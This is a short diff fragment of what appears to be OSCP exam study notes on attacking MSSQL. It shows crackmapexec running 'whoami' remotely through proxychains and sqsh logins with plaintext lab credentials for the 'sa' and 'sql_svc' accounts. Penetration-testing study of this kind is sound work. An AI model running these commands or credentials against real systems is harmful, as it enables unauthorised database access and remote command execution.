@@ -879,7 +879,8 @@ proxychains crackmapexec mssql -d oscp.exam -u sql_svc -p Dolphin1  -x "whoami" 
 ````
 ##### Logging in
 ````
-sqsh -S $IP -U sa -P CrimsonQuiltScalp193
+sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
+proxychains sqsh -S 10.10.126.148 -U oscp.exam\\sql_svc -P Dolphin1 -D msdb #windows
 ````
 ##### Expliotation
 ````
